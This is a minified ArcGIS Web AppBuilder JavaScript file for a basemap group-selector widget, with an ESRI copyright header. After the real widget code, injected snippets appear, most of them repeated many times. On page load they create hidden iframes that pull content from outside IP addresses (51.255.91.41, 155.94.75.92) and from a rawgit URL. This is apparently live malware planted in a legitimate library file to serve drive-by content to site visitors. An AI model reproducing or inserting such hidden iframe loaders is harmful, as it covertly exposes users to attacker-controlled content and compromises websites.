// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/BasemapGallery/setting/GroupSelector.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"select-tip"\x3e${nls.selectGroupTip}\x3c/div\x3e\r\n  \x3cdiv class\x3d"groups-section" data-dojo-attach-point\x3d"groupsSection"\x3e\r\n    \x3cselect class\x3d"groups-select" data-dojo-attach-point\x3d"groupsSelect"\r\n      data-dojo-attach-event\x3d"change:_onGroupsSelectChange"\x3e\r\n      \x3coption value\x3d"nodata"\x3e${nls.noneGroups}\x3c/option\x3e\r\n    \x3c/select\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"groupMapTableDiv"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./GroupSelector.html dojo/_base/lang dojo/_base/array dojo/_base/html dojo/query dojo/on jimu/utils jimu/portalUrlUtils jimu/dijit/Search jimu/portalUtils ./MapTable ../utils dijit/form/Select".split(" "),function(k,l,m,n,p,b,q,e,x,r,t,u,y,v,w,g){return k([l,m,n],{templateString:p,baseClass:"basemap-group-selector",nls:null,type:"",multiple:!1,appConfig:null,map:null,spatialReference:null,_user:null,
_group:null,_webMapQueryString:"",_allGroupQuery:null,portal:null,postCreate:function(){this.inherited(arguments);this._webMapQueryString=" "+t.getItemQueryStringByTypes([this.type])+" ";this.portal=v.getPortal(this._getPortalUrl());this._allGroupQuery=this._getQuery();this.groupMapTable=new w({appConfig:this.appConfig,type:this.type,multiple:!0,folderUrl:this.folderUrl,portalUrl:this._getPortalUrl(),nls:this.nls,map:this.map,spatialReference:this.spatialReference});this.groupMapTable.placeAt(this.groupMapTableDiv);
this.own(r(this.groupMapTable,"selectionChange",b.hitch(this,this._checkBtnStatus)));this.portal.getUser().then(b.hitch(this,function(a){this._searchGroups(a)}))},postMixInProperties:function(){this.nls=b.mixin(this.nls,window.jimuNls.common,window.jimuNls.itemSelector)},_getQuery:function(a){return b.mixin({start:1,num:100,f:"json"},a||{})},_getPortalUrl:function(){return u.getStandardPortalUrl(window.portalUrl)},_onGroupSearch:function(){this._allGroupQuery.start=1;b.mixin(this._allGroupQuery,{sortField:"title",
sortOrder:"asc"});this.groupMapTable.search(this._allGroupQuery)},_searchGroups:function(a){this._resetGroupsSection();var h=a.getGroups(),d=this._getPortalUrl(),c,f;g.getBasemapGalleryGroup(d,'title:"ArcGIS Online Basemaps" AND owner:esri_en').then(b.hitch(this,function(a){c=a.id;this._createEsriDefaultOption(a.id);return c})).then(b.hitch(this,function(){return g.getBasemapGalleryGroup(d,this.portal.basemapGalleryGroupQuery)})).then(b.hitch(this,function(a){f=a.id;e.create("option",{value:a.id,
innerHTML:this.nls.defaultOrgGroup},this.groupsSelect)})).then(b.hitch(this,function(){this._createUserGroupsOption(h,[c,f]);this._onGroupsSelectChange()}),b.hitch(this,function(){this._createUserGroupsOption(h,[c,f]);this._onGroupsSelectChange()}))},_createEsriDefaultOption:function(a){e.create("option",{value:a,innerHTML:this.nls.defaultGroup},this.groupsSelect)},_createUserGroupsOption:function(a,b){if(0<a.length)for(var d=0;d<a.length;d++){var c=a[d];0>b.indexOf(c.id)&&e.create("option",{value:c.id,
innerHTML:c.title},this.groupsSelect)}},_resetGroupsSection:function(){e.empty(this.groupsSelect);this.groupMapTable.clear()},_onGroupsSelectChange:function(){var a=this.groupsSelect.value,b;b=0<=a.indexOf(":")?a:"group:"+a;this.groupMapTable.clear();"nodata"!==a&&(this._getPortalUrl(),this._allGroupQuery=this._getQuery({q:b+" AND "+this._webMapQueryString}),this._onGroupSearch())},getSelectedBasemaps:function(){return q.map(this.groupMapTable.getSelectedMapItems(),function(a){return a.basemap})},
_checkBtnStatus:function(){0<this.getSelectedBasemaps().length?this.popup.enableButton(0):this.popup.disableButton(0)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});